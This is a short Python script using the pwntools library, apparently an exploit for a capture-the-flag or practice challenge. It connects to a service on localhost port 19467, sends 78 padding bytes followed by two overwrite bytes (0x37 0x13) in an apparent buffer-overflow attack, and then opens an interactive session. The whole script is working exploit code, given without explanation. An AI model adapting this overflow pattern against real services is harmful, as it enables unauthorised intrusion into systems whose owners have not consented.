from pwn import *

p = remote("localhost", 19467) 


p.sendline(b"A" * 78 + b"\x37\x13")

p.interactive()
